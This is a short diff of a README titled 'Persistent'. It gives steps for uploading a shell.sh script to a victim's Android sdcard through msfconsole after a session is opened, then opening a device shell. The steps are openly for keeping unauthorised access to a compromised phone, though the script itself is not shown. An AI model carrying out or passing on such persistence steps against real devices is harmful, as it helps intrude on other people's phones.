@@ -1,6 +1,6 @@
 # Persistent
->Steps 
-Upload this in your victims sdcard by the following command in msfconsole after the session has been opened.
+Steps 
+>Upload this in your victims sdcard by the following command in msfconsole after the session has been opened.
 upload /path/to/shell.sh /sdcard
 Access device shell by command
 shell
